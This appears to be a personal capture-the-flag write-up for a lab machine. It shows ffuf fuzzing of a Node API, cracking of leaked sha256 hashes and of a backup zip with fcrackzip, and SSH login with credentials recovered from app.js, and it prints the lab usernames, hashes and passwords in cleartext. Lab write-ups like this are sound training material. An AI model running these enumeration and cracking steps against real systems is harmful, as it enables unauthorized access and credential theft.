# Web Server on 3000
## Fuzzing files/api

### Burp proxy
![[Pasted image 20211106200614.png]]

### fuff
```bash
$ ffuf -u http://10.10.10.58:3000/api/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -c -fs 3861

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.58:3000/api/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 3861
________________________________________________

users                   [Status: 200, Size: 611, Words: 1, Lines: 1]
Users                   [Status: 200, Size: 611, Words: 1, Lines: 1]
session                 [Status: 200, Size: 23, Words: 1, Lines: 1]
Session                 [Status: 200, Size: 23, Words: 1, Lines: 1]
```

* Found  users and hash in [users](http://10.10.10.58:3000/api/users)
![[Pasted image 20211106200855.png]]


https://crackstation.net/
Type: sha256
* Creds
```bash
myP14ceAdm1nAcc0uNT:dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
tom:f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
mark:de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake
rastating:5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0:Not found.
```

![[Pasted image 20211106202421.png]]


### Myplace.backup
```bash
$ base64 -d myplace.backup > myplace-base64.backup

$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace-base64.backup                                                                                                             
possible pw found: magicword ()
```

* Creds mark:5AYRft73VtFpc84k
*  Can use this creds to logon on ssh
```bash
less app.js
...[snip]...

const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

```


```bash
ssh mark@10.10.10.58
```

![[Pasted image 20211106204951.png]]


